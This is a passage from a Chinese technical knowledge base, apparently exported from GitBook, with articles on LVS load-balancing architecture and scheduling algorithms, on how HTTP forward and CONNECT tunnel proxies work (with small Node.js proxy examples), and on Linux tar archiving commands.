/dev/sda1 查看/dev/sda1是否扩容成功，输入：df -TH Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:57:40 "},"知识库/03.主机安全/16.LVS架构及原理.html":{"url":"知识库/03.主机安全/16.LVS架构及原理.html","title":"16.LVS架构及原理","keywords":"","body":"LVS架构及原理 简介 LVS是Linux Virtual Server的简称，也就是Linux虚拟服务器，是一个由章文嵩博士发起的自由软件项目，官方站点是：http://www.linuxvirtualserver.org。现在LVS已经是Linux标准内核的一部分，在Linux2.4内核以前，使用LVS时必须重新编译内核以支持LVS功能模块，但是从Linux2.4内核心之后，已经完全内置了LVS的各个功能模块，无需给内核打任何补丁，可以直接使用LVS提供的各种功能。 使用LVS技术要达到的目标是：通过LVS提供的负载均衡技术和Linux操作系统实现一个高性能，高可用的服务器群集，它具有良好的可靠性、可扩展性和可操作性。从而以低廉的成本实现最优的服务性能。 LVS 架构 使用LVS架设的服务器集群系统有三个部分组成：最前端的负载均衡层（Loader Balancer），中间的服务器群组层，用Server Array表示，最底层的数据共享存储层，用Shared Storage表示。在用户看来所有的应用都是透明的，用户只是在使用一个虚拟服务器提供的高性能服务。 LVS的体系架构如图： LVS的各个层次的详细介绍： Load Balancer层：位于整个集群系统的最前端，有一台或者多台负载调度器（Director Server）组成，LVS模块就安装在Director Server上，而Director的主要作用类似于一个路由器，它含有完成LVS功能所设定的路由表，通过这些路由表把用户的请求分发给Server Array层的应用服务器（Real Server）上。同时，在Director Server上还要安装对Real Server服务的监控模块Ldirectord，此模块用于监测各个Real Server服务的健康状况。在Real Server不可用时把它从LVS路由表中剔除，恢复时重新加入。 Server Array层：由一组实际运行应用服务的机器组成，Real Server可以是WEB服务器、MAIL服务器、FTP服务器、DNS服务器、视频服务器中的一个或者多个，每个Real Server之间通过高速的LAN或分布在各地的WAN相连接。在实际的应用中，Director Server也可以同时兼任Real Server的角色。 Shared Storage层：是为所有Real Server提供共享存储空间和内容一致性的存储区域，在物理上，一般有磁盘阵列设备组成，为了提供内容的一致性，一般可以通过NFS网络文件系统共享数 据，但是NFS在繁忙的业务系统中，性能并不是很好，此时可以采用集群文件系统，例如Red hat的GFS文件系统，oracle提供的OCFS2文件系统等。 从整个LVS结构可以看出，Director Server是整个LVS的核心，目前，用于Director Server的操作系统只能是Linux和FreeBSD，linux2.6内核不用任何设置就可以支持LVS功能，而FreeBSD作为 Director Server的应用还不是很多，性能也不是很好。对于Real Server，几乎可以是所有的系统平台，Linux、windows、Solaris、AIX、BSD系列都能很好的支持。 LVS 基本工作原理 当用户向负载均衡调度器（Director Server）发起请求，调度器将请求发往至内核空间 PREROUTING链首先会接收到用户请求，判断目标IP确定是本机IP，将数据包发往INPUT链 IPVS是工作在INPUT链上的，当用户请求到达INPUT时，IPVS会将用户请求和自己已定义好的集群服务进行比对，如果用户请求的就是定义的集群服务，那么此时IPVS会强行修改数据包里的目标IP地址及端口，并将新的数据包发往POSTROUTING链 POSTROUTING链接收数据包后发现目标IP地址刚好是自己的后端服务器，那么此时通过选路，将数据包最终发送给后端的服务器 相关术语 DS：Director Server。指的是前端负载均衡器节点。 RS：Real Server。后端真实的工作服务器。 VIP：向外部直接面向用户请求，作为用户请求的目标的IP地址。 DIP：Director Server IP，主要用于和内部主机通讯的IP地址。 RIP：Real Server IP，后端服务器的IP地址。 CIP：Client IP，客户端的IP地址 三种模式及原理 LVS-NAT原理和特点 多目标IP的DNAT，通过将请求报文中的目标地址和目标端口修改为某挑出的RS的RIP和PORT实现转发 当用户请求到达Director Server，此时请求的数据报文会先到内核空间的PREROUTING链。 此时报文的源IP为CIP，目标IP为VIP PREROUTING检查发现数据包的目标IP是本机，将数据包送至INPUT链 IPVS比对数据包请求的服务是否为集群服务，若是，修改数据包的目标IP地址为后端服务器IP，后将数据包发至POSTROUTING链。 此时报文的源IP为CIP，目标IP为RIP POSTROUTING链通过选路，将数据包发送给Real Server Real Server比对发现目标为自己的IP，开始构建响应报文发回给Director Server。 此时报文的源IP为RIP，目标IP为CIP Director Server在响应客户端前，此时会将源IP地址修改为自己的VIP地址，然后响应给客户端。 此时报文的源IP为VIP，目标IP为CIP LVS-NAT模式的特性 RS应该和DIP应该使用私网地址，且RS的网关要指向DIP； 请求和响应报文都要经由director转发；极高负载的场景中，director可能会成为系统瓶颈； 支持端口映射； RS可以使用任意OS； RS的RIP和Director的DIP必须在同一IP网络； 缺陷：对Director Server压力会比较大，请求和响应都需经过director server LVS-DR原理和特点 通过为请求报文重新封装一个MAC首部进行转发，源MAC是DIP所在的接口的MAC，目标MAC是某挑选出的RS的RIP所在接口的MAC地址；源IP/PORT，以及目标IP/PORT均保持不变； 当用户请求到达Director Server，此时请求的数据报文会先到内核空间的PREROUTING链。 此时报文的源IP为CIP，目标IP为VIP PREROUTING检查发现数据包的目标IP是本机，将数据包送至INPUT链 IPVS比对数据包请求的服务是否为集群服务，若是，将请求报文中的源MAC地址修改为DIP的MAC地址，将目标MAC地址修改RIP的MAC地址，然后将数据包发至POSTROUTING链。 此时的源IP和目的IP均未修改，仅修改了源MAC地址为DIP的MAC地址，目标MAC地址为RIP的MAC地址 由于DS和RS在同一个网络中，所以是通过二层来传输。POSTROUTING链检查目标MAC地址为RIP的MAC地址，那么此时数据包将会发至Real Server。 RS发现请求报文的MAC地址是自己的MAC地址，就接收此报文。处理完成之后，将响应报文通过lo接口传送给eth0网卡然后向外发出。 此时的源IP地址为VIP，目标IP为CIP 响应报文最终送达至客户端 LVS-DR模式的特性 确保前端路由器将目标IP为VIP的请求报文发往Director： 在前端网关做静态绑定； 在RS上使用arptables； 在RS上修改内核参数以限制arp通告及应答级别； 修改RS上内核参数（arp_ignore和arp_announce）将RS上的VIP配置在lo接口的别名上，并限制其不能响应对VIP地址解析请求。 RS的RIP可以使用私网地址，也可以是公网地址；RIP与DIP在同一IP网络；RIP的网关不能指向DIP，以确保响应报文不会经由Director； RS跟Director要在同一个物理网络； 请求报文要经由Director，但响应不能经由Director，而是由RS直接发往Client； 不支持端口映射； 缺陷：RS和DS必须在同一机房中 LVS-Tun原理和特点 在原有的IP报文外再次封装多一层IP首部，内部IP首部(源地址为CIP，目标IIP为VIP)，外层IP首部(源地址为DIP，目标IP为RIP) 当用户请求到达Director Server，此时请求的数据报文会先到内核空间的PREROUTING链。 此时报文的源IP为CIP，目标IP为VIP 。 PREROUTING检查发现数据包的目标IP是本机，将数据包送至INPUT链 IPVS比对数据包请求的服务是否为集群服务，若是，在请求报文的首部再次封装一层IP报文，封装源IP为为DIP，目标IP为RIP。然后发至POSTROUTING链。 此时源IP为DIP，目标IP为RIP POSTROUTING链根据最新封装的IP报文，将数据包发至RS（因为在外层封装多了一层IP首部，所以可以理解为此时通过隧道传输）。 此时源IP为DIP，目标IP为RIP RS接收到报文后发现是自己的IP地址，就将报文接收下来，拆除掉最外层的IP后，会发现里面还有一层IP首部，而且目标是自己的lo接口VIP，那么此时RS开始处理此请求，处理完成之后，通过lo接口送给eth0网卡，然后向外传递。 此时的源IP地址为VIP，目标IP为CIP 响应报文最终送达至客户端 LVS-Tun模式的特性 DIP, VIP, RIP都应该是公网地址； RS的网关不能，也不可能指向DIP； 请求报文要经由Director，但响应不能经由Director； 不支持端口映射； RS的OS得支持隧道功能； 其实企业中最常用的是 DR 实现方式，而 NAT 配置上比较简单和方便，后续实践中会总结 DR 和 NAT 具体使用配置过程 LVS 十种调度算法 静态调度： RR（Round Robin）:轮询调度 轮询调度算法的原理是每一次把来自用户的请求轮流分配给内部中的服务器，从1开始，直到N(内部服务器个数)，然后重新开始循环。算法的优点是其简洁性，它无需记录当前所有连接的状态，所以它是一种无状态调度。【提示：这里是不考虑每台服务器的处理能力】 WRR：weight,加权轮询（以权重之间的比例实现在各主机之间进行调度） 由于每台服务器的配置、安装的业务应用等不同，其处理能力会不一样。所以，我们根据服务器的不同处理能力，给每个服务器分配不同的权值，使其能够接受相应权值数的服务请求。 SH:source hashing：源地址散列，主要实现会话绑定，能够将此前建立的session信息保留了 源地址散列调度算法正好与目标地址散列调度算法相反，它根据请求的源IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的并且没有超负荷，将请求发送到该服务器，否则返回空。它采用的散列函数与目标地址散列调度算法的相同。它的算法流程与目标地址散列调度算法的基本相似，除了将请求的目标IP地址换成请求的源IP地址，所以这里不一个一个叙述。 DH:Destination hashing:目标地址散列。把同一个IP地址的请求，发送给同一个server 目标地址散列调度算法也是针对目标IP地址的负载均衡，它是一种静态映射算法，通过一个散列（Hash）函数将一个目标IP地址映射到一台服务器。目标地址散列调度算法先根据请求的目标IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，将请求发送到该服务器，否则返回空。 动态调度： LC（Least-Connection）：最少连接 最少连接调度算法是把新的连接请求分配到当前连接数最小的服务器，最小连接调度是一种动态调度短算法，它通过服务器当前所活跃的连接数来估计服务器的负载均衡，调度器需要记录各个服务器已建立连接的数目，当一个请求被调度到某台服务器，其连接数加1，当连接中止或超时，其连接数减一，在系统实现时，我们也引入当服务器的权值为0时，表示该服务器不可用而不被调度。 简单算法：active*256+inactive(谁的小，挑谁) WLC(Weighted Least-Connection Scheduling)：加权最少连接 加权最小连接调度算法是最小连接调度的超集，各个服务器用相应的权值表示其处理性能。服务器的缺省权值为1，系统管理员可以动态地设置服务器的权限，加权最小连接调度在调度新连接时尽可能使服务器的已建立连接数和其权值成比例。 简单算法：（active*256+inactive）/weight【（活动的连接数+1）/除以权重】（谁的小，挑谁） SED(Shortest Expected Delay)：最短期望延迟 基于wlc算法 简单算法：（active+1)*256/weight【（活动的连接数+1）*256/除以权重】 NQ（never queue）:永不排队（改进的sed） 无需队列，如果有台realserver的连接数＝0就直接分配过去，不需要在进行sed运算。 LBLC（Locality-Based Least Connection）：基于局部性的最少连接 基于局部性的最少连接算法是针对请求报文的目标IP地址的负载均衡调度，不签主要用于Cache集群系统，因为Cache集群中客户请求报文的布标IP地址是变化的，这里假设任何后端服务器都可以处理任何请求，算法的设计目标在服务器的负载基本平衡的情况下，将相同的目标IP地址的请求调度到同一个台服务器，来提高个太服务器的访问局部性和主存Cache命中率，从而调整整个集群系统的处理能力。 基于局部性的最少连接调度算法根据请求的目标IP地址找出该目标IP地址最近使用的RealServer，若该Real Server是可用的且没有超载，将请求发送到该服务器；若服务器不存在，或者该服务器超载且有服务器处于一半的工作负载，则用“最少链接”的原则选出一个可用的服务器，将请求发送到该服务器。 LBLCR（Locality-Based Least Connections withReplication）：带复制的基于局部性最少连接 带复制的基于局部性最少链接调度算法也是针对目标IP地址的负载均衡，该算法根据请求的目标IP地址找出该目标IP地址对应的服务器组，按“最小连接”原则从服务器组中选出一台服务器，若服务器没有超载，将请求发送到该服务器；若服务器超载，则按“最小连接”原则从这个集群中选出一台服务器，将该服务器加入到服务器组中，将请求发送到该服务器。同时，当该服务器组有一段时间没有被修改，将最忙的服务器从服务器组中删除，以降低复制的程度。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:57:59 "},"知识库/03.主机安全/17.HTTP代理原理及实现.html":{"url":"知识库/03.主机安全/17.HTTP代理原理及实现.html","title":"17.HTTP代理原理及实现","keywords":"","body":"HTTP代理原理及实现 简介 Web 代理是一种存在于网络中间的实体，提供各式各样的功能。现代网络系统中，Web 代理无处不在。 HTTP 代理存在 两种形式 第一种RFC 7230 - HTTP/1.1: Message Syntax and Routing（即修订后的 RFC 2616，HTTP/1.1 协议的第一部分）描述的普通代理；这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文 第二种是 Tunneling TCP based protocols through Web proxy servers（通过 Web 代理服务器用隧道方式传输基于 TCP 的协议）描述的隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接，但 CONNECT 最开始并不是 RFC 2616 - HTTP/1.1 的一部分，直到 2014 年发布的 HTTP/1.1 修订版中，才增加了对 CONNECT 及隧道代理的描述，详见 RFC 7231 - HTTP/1.1: Semantics and Content。实际上这种代理早就被广泛实现 本文描述的第一种代理，对应《HTTP 权威指南》一书中第六章「代理」；第二种代理，对应第八章「集成点：网关、隧道及中继」中的 8.5 小节「隧道」。 普通代理 第一种 Web 代理原理特别简单： HTTP 客户端向代理发送请求报文，代理服务器需要正确地处理请求和连接（例如正确处理 Connection: keep-alive），同时向服务器发送请求，并将收到的响应转发给客户端。 下面这张图片来自于《HTTP 权威指南》，直观地展示了上述行为： 假如我通过代理访问 A 网站，对于 A 来说，它会把代理当做客户端，完全察觉不到真正客户端的存在，这实现了隐藏客户端 IP 的目的。当然代理也可以修改 HTTP 请求头部，通过 X-Forwarded-IP 这样的自定义头部告诉服务端真正的客户端 IP。但服务器无法验证这个自定义头部真的是由代理添加，还是客户端修改了请求头，所以从 HTTP 头部字段获取 IP 时，需要格外小心。 给浏览器显式的指定代理，需要手动修改浏览器或操作系统相关设置，或者指定 PAC（Proxy Auto-Configuration，自动配置代理）文件自动设置，还有些浏览器支持 WPAD（Web Proxy Autodiscovery Protocol，Web 代理自动发现协议）。显式指定浏览器代理这种方式一般称之为正向代理，浏览器启用正向代理后，会对 HTTP 请求报文做一些修改，来规避老旧代理服务器的一些问题 还有一种情况是访问 A 网站时，实际上访问的是代理，代理收到请求报文后，再向真正提供服务的服务器发起请求，并将响应转发给浏览器。这种情况一般被称之为反向代理，它可以用来隐藏服务器 IP 及端口。一般使用反向代理后，需要通过修改 DNS 让域名解析到代理服务器 IP，这时浏览器无法察觉到真正服务器的存在，当然也就不需要修改配置了。反向代理是 Web 系统最为常见的一种部署方式 了解完第一种代理的基本原理后，我们用 Node.js 实现一下它。只包含核心逻辑的代码如下： var http = require('http'); var net = require('net'); var url = require('url'); function request(cReq, cRes) { var u = url.parse(cReq.url); var options = { hostname : u.hostname, port : u.port || 80, path : u.path, method : cReq.method, headers : cReq.headers }; var pReq = http.request(options, function(pRes) { cRes.writeHead(pRes.statusCode, pRes.headers); pRes.pipe(cRes); }).on('error', function(e) { cRes.end(); }); cReq.pipe(pReq); } http.createServer().on('request', request).listen(8888, '0.0.0.0'); 以上代码运行后，会在本地 8888 端口开启 HTTP 代理服务，这个服务从请求报文中解析出请求 URL 和其他必要参数，新建到服务端的请求，并把代理收到的请求转发给新建的请求，最后再把服务端响应返回给浏览器。修改浏览器的 HTTP 代理为 127.0.0.1:8888 后再访问 HTTP 网站，代理可以正常工作 但是，使用我们这个代理服务后，HTTPS 网站完全无法访问，这是为什么呢？答案很简单，这个代理提供的是 HTTP 服务，根本没办法承载 HTTPS 服务。那么是否把这个代理改为 HTTPS 就可以了呢？显然也不可以，因为这种代理的本质是中间人，而 HTTPS 网站的证书认证机制是中间人劫持的克星。普通的 HTTPS 服务中，服务端不验证客户端的证书，中间人可以作为客户端与服务端成功完成 TLS 握手；但是中间人没有证书私钥，无论如何也无法伪造成服务端跟客户端建立 TLS 连接。当然如果你拥有证书私钥，代理证书对应的 HTTPS 网站当然就没问题了 HTTP 抓包神器 Fiddler 的工作原理也是在本地开启 HTTP 代理服务，通过让浏览器流量走这个代理，从而实现显示和修改 HTTP 包的功能。如果要让 Fiddler 解密 HTTPS 包的内容，需要先将它自带的根证书导入到系统受信任的根证书列表中。一旦完成这一步，浏览器就会信任 Fiddler 后续的「伪造证书」，从而在浏览器和 Fiddler、Fiddler 和服务端之间都能成功建立 TLS 连接。而对于 Fiddler 这个节点来说，两端的 TLS 流量都是可以解密的。 如果我们不导入根证书，Fiddler 的 HTTP 代理还能代理 HTTPS 流量么？实践证明，不导入根证书，Fiddler 只是无法解密 HTTPS 流量，HTTPS 网站还是可以正常访问。这是如何做到的，这些 HTTPS 流量是否安全呢？这些问题将在下一节揭晓 隧道代理 第二种 Web 代理的原理也很简单： HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。 下面这张图片同样来自于《HTTP 权威指南》，直观地展示了上述行为： 假如我通过代理访问 A 网站，浏览器首先通过 CONNECT 请求，让代理创建一条到 A 网站的 TCP 连接；一旦 TCP 连接建好，代理无脑转发后续流量即可。所以这种代理，理论上适用于任意基于 TCP 的应用层协议，HTTPS 网站使用的 TLS 协议当然也可以。这也是这种代理为什么被称为隧道的原因。对于 HTTPS 来说，客户端透过代理直接跟服务端进行 TLS 握手协商密钥，所以依然是安全的，下图中的抓包信息显示了这种场景 可以看到，浏览器与代理进行 TCP 握手之后，发起了 CONNECT 请求，报文起始行如下： CONNECT imququ.com:443 HTTP/1.1 对于 CONNECT 请求来说，只是用来让代理创建 TCP 连接，所以只需要提供服务器域名及端口即可，并不需要具体的资源路径。代理收到这样的请求后，需要与服务端建立 TCP 连接，并响应给浏览器这样一个 HTTP 报文： HTTP/1.1 200 Connection Established 浏览器收到了这个响应报文，就可以认为到服务端的 TCP 连接已经打通，后续直接往这个 TCP 连接写协议数据即可。通过 Wireshark 的 Follow TCP Steam 功能，可以清楚地看到浏览器和代理之间的数据传递： 可以看到，浏览器建立到服务端 TCP 连接产生的 HTTP 往返，完全是明文，这也是为什么 CONNECT 请求只需要提供域名和端口：如果发送了完整 URL、Cookie 等信息，会被中间人一览无余，降低了 HTTPS 的安全性。HTTP 代理承载的 HTTPS 流量，应用数据要等到 TLS 握手成功之后通过 Application Data 协议传输，中间节点无法得知用于流量加密的 master-secret，无法解密数据。而 CONNECT 暴露的域名和端口，对于普通的 HTTPS 请求来说，中间人一样可以拿到（IP 和端口很容易拿到，请求的域名可以通过 DNS Query 或者 TLS Client Hello 中的 Server Name Indication 拿到），所以这种方式并没有增加安全性。 了解完原理后，再用 Node.js 实现一个支持 CONNECT 的代理也很简单。核心代码如下： var http = require('http'); var net = require('net'); var url = require('url'); function connect(cReq, cSock) { var u = url.parse('http://' + cReq.url); var pSock = net.connect(u.port, u.hostname, function() { cSock.write('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); pSock.pipe(cSock); }).on('error', function(e) { cSock.end(); }); cSock.pipe(pSock); } http.createServer().on('connect', connect).listen(8888, '0.0.0.0'); 以上代码运行后，会在本地 8888 端口开启 HTTP 代理服务，这个服务从 CONNECT 请求报文中解析出域名和端口，创建到服务端的 TCP 连接，并和 CONNECT 请求中的 TCP 连接串起来，最后再响应一个 Connection Established 响应。修改浏览器的 HTTP 代理为 127.0.0.1:8888 后再访问 HTTPS 网站，代理可以正常工作。 最后，将两种代理的实现代码合二为一，就可以得到全功能的 Proxy 程序了，全部代码在 50 行以内（当然异常什么的基本没考虑） var http = require('http'); var net = require('net'); var url = require('url'); function request(cReq, cRes) { var u = url.parse(cReq.url); var options = { hostname : u.hostname, port : u.port || 80, path : u.path, method : cReq.method, headers : cReq.headers }; var pReq = http.request(options, function(pRes) { cRes.writeHead(pRes.statusCode, pRes.headers); pRes.pipe(cRes); }).on('error', function(e) { cRes.end(); }); cReq.pipe(pReq); } function connect(cReq, cSock) { var u = url.parse('http://' + cReq.url); var pSock = net.connect(u.port, u.hostname, function() { cSock.write('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); pSock.pipe(cSock); }).on('error', function(e) { cSock.end(); }); cSock.pipe(pSock); } http.createServer() .on('request', request) .on('connect', connect) .listen(8888, '0.0.0.0'); 需要注意的是，大部分浏览器显式配置了代理之后，只会让 HTTPS 网站走隧道代理，这是因为建立隧道需要耗费一次往返，能不用就尽量不用。但这并不代表 HTTP 请求不能走隧道代理，我们用 Node.js 写段程序验证下（先运行前面的代理服务）： var http = require('http'); var options = { hostname : '127.0.0.1', port : 8888, path : 'imququ.com:80', method : 'CONNECT' }; var req = http.request(options); req.on('connect', function(res, socket) { socket.write('GET / HTTP/1.1\\r\\n' + 'Host: imququ.com\\r\\n' + 'Connection: Close\\r\\n' + '\\r\\n'); socket.on('data', function(chunk) { console.log(chunk.toString()); }); socket.on('end', function() { console.log('socket end.'); }); }); req.end(); 这段代码运行完，结果如下： HTTP/1.1 301 Moved Permanently Server: nginx Date: Thu, 19 Nov 2015 15:57:47 GMT Content-Type: text/html Content-Length: 178 Connection: close Location: https://imququ.com/ 301 Moved Permanently 301 Moved Permanently nginx socket end. 可以看到，通过 CONNECT 让代理打开到目标服务器的 TCP 连接，用来承载 HTTP 流量也是完全没问题的。 最后，HTTP 的认证机制可以跟代理配合使用，使得必须输入正确的用户名和密码才能使用代理，这部分内容比较简单，这里略过。 HTTPS代理 普通代理可以用来承载 HTTP 流量；隧道代理可以用来承载任何 TCP 流量，包括 HTTP 和 HTTPS，他们是一个标准的 HTTP 服务，针对浏览器的普通请求和 CONNECT 请求，进行不同的处理。Node.js 为创建 HTTP 或 HTTPS Server 提供了高度一致的接口，要将 HTTP 服务升级为 HTTPS 特别方便，只有一点点准备工作要做 我们知道 TLS 有三大功能：内容加密、身份认证和数据完整性。其中内容加密依赖于密钥协商机制；数据完整性依赖于 MAC（Message authentication code）校验机制；而身份认证则依赖于证书认证机制。一般操作系统或浏览器会维护一个受信任根证书列表，包含在列表之中的证书，或者由列表中的证书签发的证书都会被客户端信任 提供 HTTPS 服务的证书可以自己生成，然后手动加入到系统根证书列表中。但是对外提供服务的 HTTPS 网站，不可能要求每个用户都手动导入你的证书，所以更常见的做法是向 CA（Certificate Authority，证书颁发机构）申请。根据证书的不同级别，CA 会进行不同级别的验证，验证通过后 CA 会用他们的证书签发网站证书，这个过程通常是收费的（有免费的证书，最近免费的 Let's Encrypt 也很火，这里不多介绍）。由于 CA 使用的证书都是由广泛内置在各系统中的根证书签发，所以从 CA 获得的网站证书会被绝大部分客户端信任。 通过 CA 申请证书很简单，本文为了方便演示，采用自己签发证书的偷懒办法。现在广泛使用的证书是 x509.v3 格式，使用以下命令可以创建： openssl genrsa -out private.pem 2048 openssl req -new -x509 -key private.pem -out public.crt -days 99999 第二行命令运行后，需要填写一些证书信息。需要注意的是 Common Name 一定要填写后续提供 HTTPS 服务的域名或 IP。例如你打算在本地测试，Common Name 可以填写 127.0.0.1。证书创建好之后，再将 public.crt 添加到系统受信任根证书列表中。为了确保添加成功，可以用浏览器验证一下： 接着，可以改造之前的 Node.js 代码了，需要改动的地方不多 var http = require('http'); var https = require('https'); var fs = require('fs'); var net = require('net'); var url = require('url'); function request(cReq, cRes) { var u = url.parse(cReq.url); var options = { hostname : u.hostname, port : u.port || 80, path : u.path, method : cReq.method, headers : cReq.headers }; var pReq = http.request(options, function(pRes) { cRes.writeHead(pRes.statusCode, pRes.headers); pRes.pipe(cRes); }).on('error', function(e) { cRes.end(); }); cReq.pipe(pReq); } function connect(cReq, cSock) { var u = url.parse('http://' + cReq.url); var pSock = net.connect(u.port, u.hostname, function() { cSock.write('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); pSock.pipe(cSock); }).on('error', function(e) { cSock.end(); }); cSock.pipe(pSock); } var options = { key: fs.readFileSync('./private.pem'), cert: fs.readFileSync('./public.crt') }; https.createServer(options) .on('request', request) .on('connect', connect) .listen(8888, '0.0.0.0'); 可以看到，除了将 http.createServer 换成 https.createServer，增加证书相关配置之外，这段代码没有任何改变。这也是引入 TLS 层的妙处，应用层不需要任何改动，就能获得诸多安全特性。 运行服务后，只需要将浏览器的代理设置为 HTTPS 127.0.0.1:8888 即可，功能照旧。这样改造，只是将浏览器到代理之间的流量升级为了 HTTPS，代理自身逻辑、与服务端的通讯方式，都没有任何变化。 参考文章 https://imququ.com/post/web-proxy.html https://imququ.com/post/web-proxy-2.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 10:39:37 "},"知识库/03.主机安全/18.Linux常用命令.html":{"url":"知识库/03.主机安全/18.Linux常用命令.html","title":"18.Linux常用命令","keywords":"","body":"Linux tar 打包（归档）压缩 归档，也称为打包，指的是一个文件或目录的集合，而这个集合被存储在一个文件中。归档文件没有经过压缩，因此，它占用的空间是其中所有文件和目录的总和。 压缩文件也是一个文件和目录的集合，且这个集合也被存储在一个文件中，但它们的不同之处在于，压缩文件采用了不同的存储方式，使其所占用的磁盘空间比集合中所有文件大小的总和要小。 压缩是指利用算法将文件进行处理，已达到保留最大文件信息，而让文件体积变小的目的。其基本原理为，通过查找文件内的重复字节，建立一个相同字节的词典文件，并用一个代码表示。比如说，在压缩文件中，有不止一处出现了 \"C语言中文网\"，那么，在压缩文件时，这个词就会用一个代码表示并写入词典文件，这样就可以实现缩小文件体积的目的。 由于计算机处理的信息是以二进制的形式表示的，因此，压缩软件就是把二进制信息中相同的字符串以特殊字符标记，只要通过合理的数学计算，文件的体积就能够被大大压缩。把一个或者多个文件用压缩软件进行压缩，形成一个文件压缩包，既可以节省存储空间，有方便在网络上传送。 对文件进行压缩，很可能损坏文件中的内容，因此，压缩又可以分为有损压缩和无损压缩。无损压缩很好理解，指的是压缩数据必须准确无误；有损压缩指的是即便丢失个别的数据，对文件也不会造成太大的影响。有损压缩广泛应用于动画、声音和图像文件中，典型代表就是影碟文件格式 mpeg、音乐文件格式 mp3 以及图像文件格式 jpg 采用压缩工具对文件进行压缩，生成的文件称为压缩包，该文件的体积通常只有原文件的一半甚至更小。需要注意的是，压缩包中的数据无法直接使用，使用前需要利用压缩工具将文件数据还原，此过程又称解压缩 Linux 下，常用归档命令有 2 个，分别是 tar 和 dd（相对而言，tar 的使用更为广泛）；常用的压缩命令有很多，比如 gzip、zip、bzip2 tar打包命令详解 最常用的归档（打包）命令就是 tar，该命令可以将许多文件一起保存到一个单独的磁带或磁盘中进行归档。不仅如此，该命令还可以从归档文件中还原所需文件，也就是打包的反过程，称为解打包。 使用 tar 命令归档的包通常称为 tar 包（tar 包文件都是以“.tar”结尾的）。 当 tar 命令用于打包操作时，该命令的基本格式为： [root@localhost ~]#tar [选项] 源文件或目录 此命令常用的选项及各自的含义如表所示 选项 含义 -c 将多个文件或目录进行打包。 -A 追加 tar 文件到归档文件。 -f 包名 指定包的文件名。包的扩展名是用来给管理员识别格式的，所以一定要正确指定扩展名； -v 显示打包文件过程； 需要注意的是，在使用 tar 命令指定选项时可以不在选项前面输入“-”。例如，使用“cvf”选项和 “-cvf”起到的作用一样。 tar -cvf anaconda-ks.cfg.tar anaconda-ks.cfg #把anacondehks.cfg打包为 anacondehks.cfg.tar文件 选项 \"-cvf\" 一般是习惯用法，记住打包时需要指定打包之后的文件名，而且要用 \".tar\" 作为扩展名。打包目录也是如此： ll -d test/ drwxr-xr-x 2 root root 4096 6月 17 21:09 test/ #test是我们之前的测试目录 tar -cvf test.tar test/ test/ test/test3 test/test2 test/test1 #把目录打包为test.tar文件 # tar命令也可以打包多个文件或目录，只要用空格分开即可。例如: tar -cvf ana.tar anaconda-ks.cfg /tmp/ #把anaconda-ks.cfg文件和/tmp目录打包成ana.tar文件包 打包并压缩目录。 首先声明一点，压缩命令不能直接压缩目录，必须先用 tar 命令将目录打包，然后才能用 gzip 命令或 bzip2 命令对打包文件进行压缩 ll -d test test.tar drwxr-xr-x 2 root root 4096 6月 17 21:09 test -rw-r--r-- 1 root root 10240 6月 18 01:06 test.tar #我们之前已经把test目录打包成test.tar文件 gzip test.tar ll test.tar.gz -rw-r--r-- 1 root root 176 6月 18 01:06 test.tar.gz #gzip命令会把test.tar压缩成test.tar.gz tar命令做解打包操作 当 tar 命令用于对 tar 包做解打包操作时，该命令的基本格式如下： [root@localhost ~]#tar [选项] 压缩包 当用于解打包时，常用的选项与含义如表 2 所示。 选项 含义 -x 对 tar 包做解打包操作。 -f 指定要解压的 tar 包的包名。 -t 只查看 tar 包中有哪些文件或目录，不对 tar 包做解打包操作。 -C 目录 指定解打包位置。 -v 显示解打包的具体过程。 其实解打包和打包相比，只是把打包选项 \"-cvf\" 更换为 \"-xvf\" tar -xvf anaconda-ks.cfg. tar #解打包到当前目录下 如果使用 \"-xvf\" 选项，则会把包中的文件解压到当前目录下。如果想要指定解压位置，则需要使用 \"-C(大写)\" 选项。例如： tar -xvf test.tar -C /tmp #把文件包test.tar解打包到/tmp/目录下 如果只想查看文件包中有哪些文件，则可以把解打包选项 \"-x\" 更换为测试选项 \"-t\"。例如： tar -tvf test.tar drwxr-xr-x root/root 0 2016-06-17 21:09 test/ -rw-r-r- root/root 0 2016-06-17 17:51 test/test3 -rw-r-r- root/root 0 2016-06-17 17:51 test/test2 -rw-r-r- root/root 0 2016-06-17 17:51 test/test1 #会用长格式显示test.tar文件包中文件的详细信息 tar命令做打包压缩（解压缩解打包）操作 你可能会觉得 Linux 实在太不智能了，一个打包压缩，居然还要先打包成 \".tar\" 格式，再压缩成 \".tar.gz\" 或 \".tar.bz2\" 格式。其实 tar 命令是可以同时打包压缩的，前面的讲解之所打包和压缩分开，是为了让大家了解在 Linux 中打包和压缩的不同。 当 tar 命令同时做打包压缩的操作时，其基本格式如下 tar [选项] 压缩包 源文件或目录 此处常用的选项有以下 2 个，分别是： -z：压缩和解压缩 \".tar.gz\" 格式； -j：压缩和解压缩 \".tar.bz2\"格式。 压缩与解压缩 \".tar.gz\"格式。 tar -zcvf tmp.tar.gz /tmp/ #把/tmp/目录直接打包压缩为\".tar.gz\"格式，通过\"-z\"来识别格式，\"-cvf\"和打包选项一致 解压缩也只是在解打包选项 \"-xvf\" 前面加了一个 \"-z\" 选项 tar -zxvf tmp.tar.gz #解压缩与解打包\".tar.gz\"格式 前面讲的选项 \"-C\" 用于指定解压位置、\"-t\" 用于查看压缩包内容，在这里同样适用。 压缩与解压缩 \".tar.bz2\" 格式。 和\".tar.gz\"格式唯一的不同就是\"-zcvf\"选项换成了 \"-jcvf\"，如下所示： tar -jcvf tmp.tar.bz2 